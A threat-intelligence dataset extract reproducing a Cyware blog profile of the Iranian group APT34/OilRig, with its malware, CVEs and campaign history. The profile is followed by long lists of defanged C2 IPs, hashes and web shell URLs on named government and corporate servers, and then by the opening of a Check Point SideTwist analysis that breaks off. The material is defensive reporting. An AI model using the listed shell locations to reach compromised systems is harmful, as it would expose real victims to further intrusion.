Campaign Leverages Rare Tool Set to Target Governmental Entities in the Middle East, Africa and Asia Advanced Persistent Threat Backdoor Read now Read now China https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/ Pagina 5 di 7"
oilrig,cti-hal,ead40c2d55a2,G0049,"APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Products Partners Resources Company Blogs "" Login Request a Demo  Go to listing page APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations Threat Actor Threat Actor Proﬁle Origin: 2014 Aliases: Helix Kitten, OilRig, Greenbug https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 1 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Key Target Sectors: Information Technology, Government, Military, Energy and Power, Communication, Transportation, Financial Services, Educational System Attack Vectors: Zero Day Attacks, Data theft, Spam Email, Remote Code Execution, Living o"" the Land Attack, Social Engineering, Spearphishing, backdoor, Luring, Watering Hole Attack Target Region: Western Asia, Western Europe, North America, South America, Southern Asia, South-East Asia, Africa, Eastern Europe Malware Used: Quadagent, Twoface, Helminth, OopsIE, Karko"", Fox Panel, HighShell, Glimpse, Webmask, RunningBee, HyperShell, ISMAgent, Poison Frog, PhpSpy, ThreeDollars, Neptun, Pickpocket, ValueVault, and Longwatch Vulnerabilities Exploited: CVE-2017-0199 and CVE-2017-11882 Overview APT34 is an Advanced Persistent Threat (APT) group, active since 2014. This group works on behalf of the Iranian government and has been observed targeting victims mostly across the Middle Eastern region. https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 2 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 They have targeted a variety of industries, including ﬁnancial, government, energy, chemical, and telecommunications, and has primarily focused its operations within the Middle East. This adversary was originally identiﬁed and tracked as two separate groups, OilRig and APT34. But further research and evidence revealed an overlap between their activities, and eventually, most researchers agreed to track them as a single Threat Actor. Most recently in mid- 2019, Turla (Cyber-espionage group from Russia) hijacked the Infrastructure of this APT, in one of their attack campaigns. Which organizations have they targeted? The group was initially observed targeting ﬁnancial organizations and government agencies across the Middle Eastern region and the US, but gradually it moved to other regions and sectors. Since 2014, the group’s attacks were focused on Middle Eastern banks and government entities since 2014. Later, their primary targets changed, but the trend of targeting critical infrastructure and governmental entities remained the same. In October 2016, the group was observed to be targeting government entities in Middle Eastern countries and https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 3 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 the U.S., along with several airlines from Middle Eastern countries. Between 2017 to 2018, the group focused more on Western-Asian and North American organizations working in Education, Information Technology and Government sector. In April 2019, information leaked by elite hackers “Lab Dookhtegan” and “Mr_L4nnist3r” revealed the victim’s names as the Saudi Arabian Communications & Information Technology Commission, Dubai Statistics Association. In the same duration, a small handful of targets were based outside the Middle East, including a telecom company in Zimbabwe, government bodies in Albania, and South Korean gaming business. Most recently in June 2019, a phishing campaign was observed, targeting energy companies, government utilities, and their workers. What is their motivation behind the attacks? This group is known to use various malware and tools to collect strategic information that would beneﬁt the economic and geopolitical interests of the state of Iran. Also, Iran considers cyber-attacks as an https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 4 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 o""ensive weapon against its rival countries like the United States of America and Israel. The cyberattacks linked to the group are not that advanced or sophisticated, but highly persistent with their victim choice, which is directly or indirectly connected to Iran’s military, ﬁnancial, and political interests. Modus Operandi Since 2014, the group is known to be using Microsoft Excel macros, PowerShell-based exploits, and social engineering to gain access to its targets. They use phishing emails to deliver weaponized Microsoft Excel documents, and most of their malware infect the target system with VisualBasic and PowerShell (.ps1) scripts. Between 2014 to 2016, the group's attack campaigns targeted banks and technology organizations in Saudi Arabia with phishing emails that included weaponized Microsoft Excel attachments. One spam email had a legitimate conversation between employees, which was used as a lure, and forwarded to other employees with a weaponized attachment. Other related campaign phishing emails used job or service o""ering. In early-2017, the group was observed again, using a fake Juniper Networks VPN portal and few fake University of https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 5 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Oxford websites to deliver malware to the victims. The group registered four domain names belonging to Oxford University (including oxford- careers[.]com, oxford[.]in and oxford- employee[.]com). In April 2017, they launched a massive cyber-espionage campaign against major Israeli institutions and government o#cials. They exploited CVE-2017-0199 remote code execution vulnerability in the Windows Object Linking and Embedding (OLE) application programming interface. They managed to target the victims before Microsoft issued a security update, and organizations rolled out the patch. In May 2017, they expanded their geographical range with hundreds of new attacks targeting several militaries, ﬁnancial and energy businesses in Europe as well as the United States. In these attacks, they collaborated with Russian hackers-for-hire. In Sep. 2017, an analysis done by a security ﬁrm on Two-face (web shell) disclosed a complex malicious infrastructure that was targeting Israeli institutions earlier in April. The links between TwoFace and ﬁve other web shells were found, including RunningBee, PuTTY Link (plink) and Share Blog Post     https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 6 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 RGDoor (for Microsoft IIS). In Oct. 2017, the group developed the ""Agent Injector"" (Trojan with the speciﬁc purpose of installing the ISMAgent backdoor) to target an organization within the United Arab Emirates government. The attack used a spearphishing spam email that had a subject of ‘Importan Issue'. The group was also found to be using CVE-2017- 11882, an O#ce vulnerability patched by Microsoft on November 14, 2017. On January 8, 2018, the group launched an attack on an insurance agency based in the Middle East. They tried to deliver a new Trojan called OopsIE, via using a variant of the ThreeDollars delivery document. They sent two emails to two separate email addresses within the same organization. The email address was linked with the Lebanese domain of a major global ﬁnancial institution. In Feb 2018, it was discovered that threat actor dubbed ‘Chafer’ (having an association or related to APT34) successfully compromised one of the biggest telecom ﬁrms in the Middle East using leaked NSA hacking tools. In March 2018, the group improved their Critical Infrastructure attacks with new o""-the-shelf tools, dual-purpose utilities. They were found to be using earlier unseen malware, that uses https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 7 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 SmartFile, Google Drive, and internet server API (ISAPI) ﬁlters for compromising Microsoft Internet Information Services (IIS) servers. In July 2018, they launched multiple attacks using spearphishing email (having attached PhpSpy and QuadAgent backdoor) to target an unnamed technology services provider, the Lebanese intelligence agency, and healthcare facilities in Saudi Arabia. Their initial infection paths were based on watering hole attacks using compromised web servers. In Sep., they deployed a new variant of their OopsIE Trojan that came with new evasion techniques. In the same month, they also conducted at least one attack campaign containing an updated variant of the BondUpdater Trojan (uses DNS tunneling) as its ﬁnal payload. In Nov. 2018, new information shed light on the fact that the group tests their malicious documents before they are being used in their attacks. In April 2019, a group that calls itself Lab Dookhtegan exposed several tools (Poison Frog, Glimpse, HyperShell, HighShell, Fox Panel, and Webmask) used by this group. In the same month, a DNSpionage malware campaign was also discovered, https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 8 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 using a new malware called 'Karko"".' The malware was delivered via an Excel document that included malicious macros. They also created a new remote administration tool that supported HTTP and DNS communication. Most recently in June 2019, a Russian cyber-espionage group ""Turla"" was discovered to be using attack infrastructure belonging to APT34. The infrastructure was used to deliver a backdoor called ""Neptun,"" installed on Microsoft Exchange servers. Also in June, a phishing campaign was observed asking victims to join their social network. This time the group masqueraded as a Cambridge University lecturer, also setting up a LinkedIn page in order to gain victims’ trust. From there they asked victims to open malicious documents. In this phishing campaign, three new malware families were detected, named as Pickpocket, ValueVault, and Longwatch. Known tools and malware This group is known to use multiple custom malware and tools for stealing intellectual information, lateral movement, and getting an initial foothold into the targeted network. https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…loves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 9 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Malicious programs used by APT34 Twoface - A web shell, which is used to harvest credentials Powruner - A backdoor known to be used by APT34. RGDoor - An Internet Information Services backdoor which is created using C++. Helminth - A Trojan that is developed to target the Windows platform. OopsIE - A Trojan deployed and known to be used by APT34. Karko! - A malware designed to execute code remotely on compromised hosts. ISMAgent - A backdoor which has a sophisticated architecture and contains anti-analysis techniques. Poison Frog - A backdoor used along with BondUpdater tool. PhpSpy - A backdoor used for an initial foothold in the targeted network. Neptun - A backdoor installed on Microsoft Exchange servers as a service. Pickpocket - It is a browser credential- theft tool. ValueVault - It is used to extract and view the credentials stored in the Windows Vault. LongWatch - A Pickpocket variant, and browser credential-theft tool. https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 10 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Custom tools used by APT34 Quadagent - A PowerShell backdoor tool, that is attributed to APT34. ThreeDollars - A delivery document, which is identiﬁed as part of the OilRig toolset. Fox Panel - A hacking tool is known to be linked and used by APT34 HighShell - A web shell-based TwoFace payload used by APT34. Glimpse - A tool within the data dump, related to the updated BondUpdater tool. Webmask - A series of scripts speciﬁcally meant to perform DNS hijacking. RunningBee - A web-based TwoFace payload used by APT34. HyperShell - A TwoFace loader known to used by APT34. Known Zero Days Vulnerabilities Microsoft O""ce Remote Code Execution Vulnerability (CVE-2017- 0199) - A remote code-execution vulnerability in Microsoft O#ce/Wordpad. Microsoft O""ce Memory Corruption Vulnerability (CVE-2017-11882) - A memory-corruption vulnerability in Microsoft O#ce. https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-grou…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 11 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 Attribution The use of infrastructure linked to Iranian operations, alignment, and timing with the national interests of Iran lead to the conclusion that this group acts or works on behalf of the Iranian government. The persistency in the targets of their attack, which are mostly from middle-east countries, also proves the fact that the cyberattacks originated from Iran. Most of their cyber campaigns became active when there was a holiday in Iran, and targeted speciﬁc countries with conﬂict of interest with Iran. Prevention Organizations and security experts should review the Indicators of Compromise (IoCs) and use them with their Endpoint Detection and Response (EDR) tool. Organizations should also consider having threat intel ingestion for their existing investments in the stack of security tools like Firewalls, Intrusion Detection and Prevention Systems (IDS/IPS), etc. with support for automated enrichment from external sources, which would ensure protection from latest threats across the industry. The security experts must understand the fact that fully up-to- date antivirus (AV) or reliable antivirus software do not provide 100% protection https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 12 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 against sophisticated attacks from threats like APT34. For adequate protection, they need a layered approach to their endpoint security. Ideally, these layers must combine solutions based on dynamic security policy (e.g., behavioral-based Firewalls, Data Loss Prevention systems) as well as the control- based security policy (e.g., whitelisting, application control). Enterprise networks with endpoint security solutions based on the OS-Centric security approach are more secure against the new types of APT34 attacks. The OS-centric security solutions focus on the ﬁnal stage of the attack kill chain, and intended damage, so it provides better protection no matter what attack vector or method is used. Indicators of Compromise Iranian Intelligence Server 185[.]56[.]91[.]61 46[.]165[.]246[.]196 185[.]236[.]76[.]80 185[.]236[.]77[.]17 185[.]181[.]8.252 185[.]191[.]228[.]103 70[.]36[.]107[.]34 109[.]236[.]85[.]129 185[.]15[.]247[.]140 185[.]181[.]8.158 178[.]32[.]127[.]230 146[.]112[.]61[.]108 https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 13 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 23[.]106[.]215[.]76 185[.]20[.]187[.]8 95[.]168[.]176[.]172 173[.]234[.]153[.]194 173[.]234[.]153[.]201 172[.]241[.]140[.]238 23[.]19[.]226[.]69 185. 161[.]211[.]86 185[.]174[.]100[.]56 194[.]9.177[.]15 185[.]140[.]249[.]63 81[.]17[.]56[.]249 213[.]227[.]140[.]32 46[.]105[.]251[.]42 185[.]140[.]249[.]157 198[.]143[.]182[.]22 213[.]202[.]217[.]9 158[.]69[.]57[.]62 168[.]187[.]92[.]92 38[.]132[.]124[.]153 176[.]9.164[.]215 88[.]99[.]246[.]174 190[.]2.142[.]59 103[.]102[.]44[.]181 217[.]182[.]217[.]122 46[.]4.69[.]52 185[.]227[.]108[.]35 172[.]81[.]134[.]226 103[.]102[.]45[.]14 95[.]168[.]176[.]173 142[.]234[.]200[.]99 194[.]9.179[.]23 194[.]9.178[.]10 https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 14 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 185[.]174[.]102[.]14 185[.]236[.]76[.]35 185[.]236[.]77[.]75 185[.]161[.]209[.]157 185[.]236[.]76[.]59 185[.]236[.]78[.]217 23[.]227[.]201[.]6 185[.]236[.]78[.]63 IoCs of Leaked Hacking Tools (April 219) SHA256 27e03b98ae0f6f2650f378e9292384f1350f95 ee4f3ac009e0113a8d9e2e14ed b1d621091740e62c84fc8c62bcdad07873c8b 61b83faba36097ef150fd6ec768 2943e69e6c34232dee3236ced38d41d37878 4a317eeaf6b90482014210fcd459 07e791d18ea8f2f7ede2962522626b43f28cb 242873a7bd55""f4feb91299741 dd6d7af00ef4ca89a319a230cdd094275c3a1 d365807fe5b34133324bdaa0229 3ca3a957c526eaeabcf17b0b2cd345c0""fab5 49adfdf04470b6983b87f7ec62 c9d5dc956841e000bfd8762e2f0b48b66c79b 79500e894b4efa7fb9ba17e4e9e a6a0fbfee08367046d3d26fb4b4cf7779f7fb6 eaf7e60e1d9b6bf31c5be5b63e Fe1b011fe089969d960d2dce2a61020725a02 e15dbc812ee6b6ecc6a98875392 Shells hxxps://202[.]183[.]235[.]31/owa/auth/signo https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 15 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 ut[.]aspx hxxps://202[.]183[.]235[.]4/owa/auth/signout [.]aspx hxxps://122[.]146[.]71[.]136/owa/auth/error3 [.]aspx hxxps://59[.]124[.]43[.]229/owa/auth/error0[. ]aspx hxxps://202[.]134[.]62[.]169/owa/auth/signin [.]aspx hxxps://202[.]164[.]27[.]206/owa/auth/signo ut[.]aspx hxxps://213[.]14[.]218[.]51/owa/auth/logon[.] aspx hxxps://88[.]255[.]182[.]69/owa/auth/getidto ken[.]aspx hxxps://95[.]0.139[.]4/owa/auth/logon[.]aspx hxxps://1[.]202[.]179[.]13/owa/auth/error1[.] aspx hxxps://1[.]202[.]179[.]14/owa/auth/error1[.] aspx hxxps://114[.]255[.]190[.]1/owa/auth/error1[. ]aspx hxxps://180[.]166[.]27[.]217/owa/auth/error3 [.]aspx hxxps://180[.]169[.]13[.]230/owa/auth/error1 [.]aspx hxxps://210[.]22[.]172[.]26/owa/auth/error1[. ]aspx hxxps://221[.]5.148[.]230/owa/auth/outlook[. ]aspx hxxps://222[.]178[.]70[.]8/owa/auth/outlook[ .]aspx hxxps://222[.]66[.]8.76/owa/auth/error1[.]as https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 16 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 px hxxps://58[.]210[.]216[.]113/owa/auth/error1 [.]aspx hxxps://60[.]247[.]31[.]237/owa/auth/error3[. ]aspx hxxps://60[.]247[.]31[.]237/owa/auth/logo""[. ]aspx hxxps://202[.]104[.]127[.]218/owa/auth/error 1[.]aspx hxxps://202[.]104[.]127[.]218/owa/auth/expp w[.]aspx hxxps://132[.]68[.]32[.]165/owa/auth/logout[. ]aspx hxxps://132[.]68[.]32[.]165/owa/auth/signout [.]aspx hxxps://209[.]88[.]89[.]35/owa/auth/logout[.] aspx hxxps://114[.]198[.]235[.]22/owa/auth/login[. ]aspx hxxps://114[.]198[.]237[.]3/owa/auth/login[.] aspx hxxps://185[.]10[.]115[.]199/owa/auth/logout [.]aspx hxxps://195[.]88[.]204[.]17/owa/auth/logout[. ]aspx hxxps://46[.]235[.]95[.]125/owa/auth/signin[. ]aspx hxxps://51[.]211[.]184[.]170/owa/auth/owaa uth[.]aspx hxxps://91[.]195[.]89[.]155/owa/auth/signin[. ]aspx hxxps://82[.]178[.]124[.]59/owa/auth/gettoke nid[.]aspx https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 17 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 hxxps://83[.]244[.]91[.]132/owa/auth/logon[.] aspx hxxps://195[.]12[.]113[.]50/owa/auth/error3[. ]aspx hxxps://78[.]100[.]87[.]199/owa/auth/logon[.] aspx hxxps://110[.]74[.]202[.]90/owa/auth/error""[ .]aspx hxxps://211[.]238[.]138[.]68/owa/auth/error1 [.]aspx hxxps://168[.]63[.]221[.]220/owa/auth/error3 [.]aspx hxZps://213[.]189[.]82[.]221/owa/auth/errorf f[.]aspx hxxps://205[.]177[.]180[.]161/owa/auth/error ef[.]aspx hxxps://77[.]42[.]251[.]125/owa/auth/logout[. ]aspx hxxps://202[.]175[.]114[.]11/owa/auth/error1 [.]aspx hxxps://202[.]175[.]31[.]141/owa/auth/error3 [.]aspx hxxps://213[.]131[.]83[.]73/owa/auth/error4[. ]aspx hxxps://187[.]174[.]201[.]179/owa/auth/error 1[.]aspx hxxps://200[.]33[.]162[.]13/owa/auth/error3[. ]aspx hxxps://202[.]70[.]34[.]68/owa/auth/error0[.] aspx hxxps://202[.]70[.]34[.]68/owa/auth/error1[.] aspx hxxps://197[.]253[.]14[.]10/owa/auth/logout[. https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 18 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 ]aspx hxxps://41[.]203[.]90[.]221/owa/auth/logout[. ]aspx hxxp://www[.]abudhabiairport[.]ae/english/r esources[.]aspx hxxps://mailkw[.]agility[.]com/owa/auth/Redi rSuiteService[.]aspx hxxp://www[.]ajfd[.]gov[.]ae/_layouts/workpa ge[.]aspx hxxps://mail[.]alfuttaim[.]ae/owa/auth/chang e_password[.]aspx hxxps://mail[.]alraidah[.]com[.]sa/owa/auth/ GetLoginToken[.]aspx hxxp://www[.]alraidah[.]com[.]sa/_layouts/W rkSetlan[.]aspx hxxps://webmail[.]alsalam[.]aero/owa/auth/E ventClass[.]aspx hxxp://www[.]alraidah[.]com[.]sa/_layouts/W rkSetlan[.]aspx hxxps://webmail[.]alsalam[.]aero/owa/auth/E ventClass[.]aspx hxxps://webmail[.]bix[.]bh/owa/auth/Timeou tctl[.]aspx hxxps://webmail[.]bix[.]bh/owa/auth/EventCl ass[.]aspx hxxps://webmail[.]bix[.]bh/ecp/auth/EventCl ass[.]aspx hxxps://webmail[.]citc[.]gov[.]sa/owa/auth/ti meout[.]aspx hxxps://mail[.]cma[.]org[.]sa/owa/auth/signin [.]aspx hxxps://mail[.]dallah- hospital[.]com/owa/auth/getidtokens[.]aspx https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 19 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 hxxps://webmail[.]dha[.]gov[.]ae/owa/auth/o utlookservice[.]aspx hxxps://webmail[.]dnrd[.]ae/owa/auth/getidt oken[.]aspx hxxp://dnrd[.]ae:8080/_layouts/WrkStatLog[.] aspx hxxps://www[.]dns[.]jo/statistic[.]aspx hxxps://webmail[.]dsc[.]gov[.]ae/owa/auth/o utlooklogonservice[.]aspx hxxps://e-albania[.]al/dptaktkonstatim[.]aspx hxxps://owa[.]e- albania[.]al/owa/auth/outlookdn[.]aspx hxxps://webmail[.]eminsco[.]com/owa/auth/ outlookﬁlles[.]aspx hxxps://webmail[.]eminsco[.]com/owa/auth/ OutlookCName[.]aspx hxxps://webmail[.]emiratesid[.]ae/owa/auth/ RedirSuiteService[.]aspx hxxps://mailarchive[.]emiratesid[.]ae/Enterpr iseVault/js/jquery[.]aspx hxxps://webmail[.]emiratesid[.]ae/owa/auth/ handlerservice[.]aspx hxxp://staging[.]forus[.]jo/_layouts/explained it[.]aspx hxxps://government[.]ae/tax[.]aspx hxxps://formerst[.]gulfair[.]com/GFSTMSSSP R/webform[.]aspx hxxps://webmail[.]ictfund[.]gov[.]ae/owa/aut h/owaauth[.]aspx hxxps://jaf[.]mil[.]jo/ShowContents[.]aspx hxxp://www[.]marubi[.]gov[.]al/aspx/viewper cthesaurus[.]aspx hxxps://mail[.]mindware[.]ae/owa/auth/outl https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 20 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 ooktoken[.]aspx hxxps://mail[.]mis[.]com[.]sa/owa/auth/Redir ect[.]aspx hxxps://webmail[.]moe[.]gov[.]sa/owa/auth/r edireservice[.]aspx hxxps://webmail[.]moe[.]gov[.]sa/owa/auth/r edirectcache[.]aspx hxxps://gis[.]moei[.]gov[.]ae/petrol[.]aspx hxxps://gis[.]moenr[.]gov[.]ae/petrol[.]aspx hxxps://m[.]murasalaty[.]moenr[.]gov[.]ae/si gnproces[.]aspx hxxps://mail[.]mofa[.]gov[.]iq/owa/auth/Redi rSuiteService[.]aspx hxxp://ictinfo[.]moict[.]gov[.]jo/DI7Web/librar ies/aspx/RegStructures[.]aspx hxxp://www[.]mpwh[.]gov[.]jo/_layouts/Creat eAdAccounts[.]aspx hxxps://mail[.]mygov[.]ae/owa/auth/owalogi n[.]aspx hxxps://ksa[.]olayan[.]net/owa/auth/signin[.] aspx hxxps://mail[.]omantourism[.]gov[.]om/owa/ auth/GetTokenId[.]aspx hxxps://email[.]omnix- group[.]com/owa/auth/signon[.]aspx hxxps://mail[.]orange- jtg[.]jo/OWA/auth/signin[.]aspx hxxp://fwx1[.]petra[.]gov[.]jo/SEDCOWebServ er/global[.]aspx hxxp://fwx1[.]petranews[.]gov[.]jo/SEDCOWe bServer/content/rtl/QualityControl[.]aspx hxxps://webmail[.]presﬂt[.]ae/owa/auth/logo ntimeout[.]aspx https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 21 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 hxxps://webmail[.]qchem[.]com/OWA/auth/R edirectCache[.]aspx hxxps://meet[.]saudiairlines[.]com/ClientRes ourceHandler[.]aspx hxxps://mail[.]soc[.]mil[.]ae/owa/auth/expire pw[.]aspx hxxps://email[.]ssc[.]gov[.]jo/owa/auth/signin [.]aspx hxxps://mail[.]sts[.]com[.]jo/owa/auth/signou t[.]aspx hxxp://www[.]sts[.]com[.]jo/_layouts/15/mov eresults[.]aspx hxxps://mail[.]tameen[.]ae/owa/auth/outloo klogon[.]aspx hxxps://webmail[.]tra[.]gov[.]ae/owa/auth/ou tlookdn[.]aspx hxxp://bulksms[.]umniah[.]com/gmgweb/MS GTypesValid[.]aspx hxxps://evserver[.]umniah[.]com/index[.]asp x hxxps://email[.]umniah[.]com/owa/auth/redi rSuite[.]aspx hxxps://webmail[.]gov[.]jo/owa/auth/getidto kens[.]aspx hxxps://www[.]tra[.]gov[.]ae/signin[.]aspx hxxps://www[.]zakatfund[.]gov[.]ae/zfp/web/ tofollowup[.]aspx hxxps://mail[.]zayed[.]org[.]ae/owa/auth/esp w[.]aspx hxxps://mail[.]primus[.]com[.]jo/owa/auth/ge tidtoken[.]aspx C2 Servers https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 22 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 185[.]56[.]91[.]61 46[.]165[.]246[.]196 185[.]236[.]76[.]80 185[.]236[.]77[.]17 185[.]181[.]8.252 185[.]191[.]228[.]103 70[.]36[.]107[.]34 109[.]236[.]85[.]129 185[.]15[.]247[.]140 185[.]181[.]8.158 178[.]32[.]127[.]230 146[.]112[.]61[.]108 23[.]106[.]215[.]76 185[.]20[.]187[.]8 95[.]168[.]176[.]172 173[.]234[.]153[.]194 173[.]234[.]153[.]201 172[.]241[.]140[.]238 23[.]19[.]226[.]69 185[.]161[.]211[.]86 185[.]174[.]100[.]56 194[.]9.177[.]15 185[.]140[.]249[.]63 81[.]17[.]56[.]249 213[.]227[.]140[.]32 46[.]105[.]251[.]42 185[.]140[.]249[.]157 198[.]143[.]182[.]22 213[.]202[.]217[.]9 158[.]69[.]57[.]62 168[.]187[.]92[.]92 38[.]132[.]124[.]153 176[.]9.164[.]215 https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 23 di 28 APT34: The Helix Kitten Cybercriminal Group Loves to Meow Middle Eastern and International Organizations | Blog 06/08/24, 10:58 88[.]99[.]246[.]174 190[.]2.142[.]59 103[.]102[.]44[.]181 217[.]182[.]217[.]122 46[.]4.69[.]52 185[.]227[.]108[.]35 172[.]81[.]134[.]226 103[.]102[.]45[.]14 95[.]168[.]176[.]173 142[.]234[.]200[.]99 194[.]9.179[.]23 194[.]9.178[.]10 185[.]174[.]102[.]14 185[.]236[.]76[.]35 185[.]236[.]77[.]75 185[.]161[.]209[.]157 185[.]236[.]76[.]59 185[.]236[.]78[.]217 23[.]227[.]201[.]6 185[.]236[.]78[.]63  TAGS helix kitten greenbug oilrig iran apt34 Posted on: August 22, 2019  PREVIOUS Turning the Tables on Threat Actors by L...  NEXT List of Data Breaches, Malware, Vul... https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-gro…oves-to-meow-middle-eastern-and-international-organizations-48ae Pagina 24 di 28"
oilrig,cti-hal,44dbc70cb02b,G0049,"Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 POPULAR POSTS ARTIFICIAL INTELLIGENCE CHATGPT CHECK POINT RESEARCH PUBLICATIONS OPWNAI : Cybercriminals Starting to Use ChatGPT CHECK POINT RESEARCH PUBLICATIONS THREAT RESEARCH IRAN’S APT34 RETURNS WITH AN UPDATED ARSENAL April 8, 2021 Introduction Check Point Research discovered evidence of a new campaign by the Iranian threat group APT34 (aka OilRig), against what appears to be a Lebanese target, employing a new backdoor variant we dubbed SideTwist . Hacking Fortnite Accounts Since the 2019 leak of APT34’s tools by an entity named “Lab Dookhtegan”, the threat group has been actively retooling and updating their payload arsenal to try and avoid detection, creating several different malware variants whose ultimate purpose remained the same: to gain the initial foothold on the targeted device. ARTIFICIAL INTELLIGENCE CHATGPT CHECK POINT RESEARCH PUBLICATIONS Starting with the DNSpionage campaign back in 2018, APT34 has been observed targeting individuals through the use of booby-trapped job opportunity documents, delivered directly to the selected targets via LinkedIn messages. This activity continued through 2019 with the HardPass operation, in which the LinkedIn platform was used in the same manner. In this latest campaign from January, a document submitted to VirusTotal from Lebanon (a common target for APT34), also depicts such a job opportunity document, although in this case we were unable to conﬁrm the initial delivery mechanism to the target. In the following article we analyze the latest infection chain used by the attackers and deep dive into the new malware variant. OpwnAI: AI That Can Save the Day or HACK it Away Initial Infection Our analysis began with a malicious Microsoft Word document named Job-Details.doc (md5: 6615c410b8d7411ed14946635947325e ). https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ Pagina 1 di 8 Iran’s APT34 Returns with an Updated Arsenal - Check Point Research 08/08/24, 11:28 Fig 1: Lure document with malicious macros The decoy document clearly tries to appear like a benign document, offering various positions in the Ntiva IT consulting company – a company based in Virginia, US. However, once the user activates the embedded malicious macros, the full infection ﬂow is triggered: Fig 2: Infection Flow Malicious Macros with DNS tunneling Macros used by APT34’s job opportunity campaigns have evolved through the years, but also managed to keep their own distinctive style and purpose: Veriﬁcation that there is a mouse connected to the PC (Anti-Sandboxing technique). Initial 